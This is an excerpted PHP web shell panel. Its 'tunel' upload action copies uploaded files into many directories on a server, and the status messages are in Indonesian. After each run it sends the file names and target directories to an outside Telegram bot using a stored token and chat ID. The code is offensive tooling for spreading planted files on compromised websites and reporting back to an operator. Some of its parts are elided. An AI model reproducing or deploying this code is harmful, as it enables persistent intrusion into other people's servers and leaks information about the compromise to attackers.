    ...
    if ($act==='tunel' && isset($_FILES['tunel_files'])) {
        ...
        for ($i=0; $i<$n; $i++) {
            ...
            foreach ($targets as $t) {
                ...
                if ($first) {
                    if (@move_uploaded_file($tmps[$i], $dest)) { $ok++; $copies[]=$dest; }
                    else $fail++;
                    $first = false;
                } else {
                    $src = end($copies);
                    if ($src && @copy($src, $dest)) $copies[]=$dest;
                    else $fail++;
                }
            }
        }
        $dirCount = count($targets);
        $dirList  = implode(', ', array_map('td_rel', array_slice($targets,0,5)));
        td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x8C\x8A TUNEL UPLOAD","Files: <code>".implode(', ',$fnames)."</code>\nDirs (".($dirCount>5?$dirCount.' dirs':$dirList).")\nOK: $ok | Fail: $fail");
        $msg = array('type'=>'success','text'=>'&#x1F30A; TUNEL: '.$ok.' file berhasil disebarkan ke '.$dirCount.' direktori.'.($fail?' Gagal: '.$fail.'.':''));
    }
...
<div class="layout">
  ...
  <main class="main">
    ...
    <div class="content">
      ...
      <?php if ($msg['text']): ?>
      <div class="alert a-<?php echo $msg['type']; ?>"><?php echo $msg['text']; ?></div>
      <?php endif; ?>
